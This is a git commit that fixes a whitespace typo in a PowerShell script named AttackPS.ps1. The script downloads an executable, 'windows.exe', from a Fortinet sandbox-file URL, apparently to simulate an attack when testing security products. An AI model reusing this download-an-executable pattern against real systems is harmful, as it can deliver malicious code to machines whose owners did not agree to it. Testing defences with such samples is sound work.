051ec9f442ccb3526cac724fb468c12551a8ae0d
Alberto <alberto.briano@outlook.com>
2026-06-15 22:32:50 +0200

    fixed typo

--- Windows/AttackPS.ps1
+++ Windows/AttackPS.ps1
@@ -1,5 +1,5 @@
 $down = New-Object System.Net.WebClient
-$url  = 'https://filegen.fortinet.com/v1/sandbox-file?file_name=windows.exe';
+$url = 'https://filegen.fortinet.com/v1/sandbox-file?file_name=windows.exe';
 $file = 'windows.exe';
 $down.DownloadFile($url,$file);
 Start-Sleep -Seconds 1
